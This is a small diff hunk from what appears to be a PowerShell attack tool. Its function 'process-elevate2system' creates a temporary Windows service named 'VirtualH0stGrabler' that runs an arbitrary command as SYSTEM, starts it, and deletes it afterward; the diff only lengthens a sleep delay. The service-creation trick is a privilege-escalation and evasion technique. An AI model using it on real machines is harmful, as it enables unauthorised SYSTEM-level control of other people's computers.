@@ -272,7 +272,7 @@ function process-elevate2system {
 cmd /c SC CREATE VirtualH0stGrabler binpath= "cmd /c cmd /c $Request"
 cmd /c SC start VirtualH0stGrabler
 clear
-sleep(3.9)
+sleep(4.9)
 cmd /c SC DELETE VirtualH0stGrabler
 clear
 }
